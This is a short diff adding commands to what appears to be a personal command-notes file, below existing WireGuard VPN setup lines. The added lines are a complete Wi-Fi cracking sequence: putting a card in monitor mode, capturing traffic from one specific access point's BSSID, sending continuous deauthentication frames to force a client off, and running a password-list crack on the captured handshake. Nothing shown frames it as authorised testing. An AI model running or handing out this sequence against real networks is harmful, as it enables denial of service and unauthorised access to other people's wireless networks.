@@ -4340,3 +4340,12 @@ block menu
         sudo mv ~/wg0-client-losst.conf /etc/wireguard/wg0.conf
         wg-quick up wg0
         sudo wg show
+
+ip a
+iwconfig
+airmon-ng stop wlan0
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng wlan0mon --bssid C4:6E:1F:61:B1:0C --channel 6 -w Stalingrad
+aireplay-ng wlan0mon --deauth 0 -a C4:6E:1F:61:B1:0C -c clientMacAddr
+aircrack-ng Stalingrad-01.cap -w passwordList.txt
